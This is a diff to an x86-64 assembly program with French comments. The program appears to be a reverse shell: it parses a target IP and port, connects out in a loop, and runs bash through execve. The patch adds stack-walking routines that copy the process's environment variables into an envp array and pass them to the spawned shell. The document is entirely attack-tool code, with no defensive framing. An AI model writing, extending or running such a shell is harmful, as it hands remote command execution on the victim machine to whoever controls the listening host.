@@ -20,6 +20,7 @@ section .bss
     ip_bytes     resd 1           ; IP en format réseau
     port_bytes   resw 1           ; Port en format réseau
     sockaddr     resb 16          ; Structure sockaddr_in
+    envp         resq 256         ; Tableau des variables d'environnement
 
 section .text
     global _start
@@ -96,13 +97,42 @@ validate_and_parse_ip:
     pop rbp
     ret
 
+jmp_arg:
+    ; Boucle sur les arguments présents dans la stack jusqu'à arriver à NULL
+    mov rax, [rbx]
+    add rbx, 8
+    test rax, rax
+    jnz jmp_arg
+    ret
+
+jmp_envp:
+    lea rdi, [envp]
+env_loop:
+    ; Boucle sur les variables d'environnement présentes dans la stack jusqu'à arriver à NULL
+    mov rax, [rbx]
+    test rax, rax
+    je done
+    mov [rdi], rax
+    add rdi, 8
+    add rbx, 8
+    jmp env_loop
+done:
+    ; Fin du tableau avec NULL
+    mov qword [rdi], 0
+    ret
+
 ;----------------------------------------------------------
 ; Programme principal
 ;----------------------------------------------------------
 _start:
+    mov rbx, rsp
+    
     pop rcx                       ; argc
     cmp rcx, 2
     jne usage_error
+
+    call jmp_arg
+    call jmp_envp
     
     pop rsi                       ; argv[0]
     pop rdi                       ; argv[1] (IP)
@@ -162,7 +192,7 @@ connection_loop:
     mov rax, 59                   ; sys_execve
     lea rdi, [command]
     lea rsi, [bash_args]
-    lea rdx, [env_vars]
+    lea rdx, [envp]
     syscall
 
     ; En cas d'échec d'execve
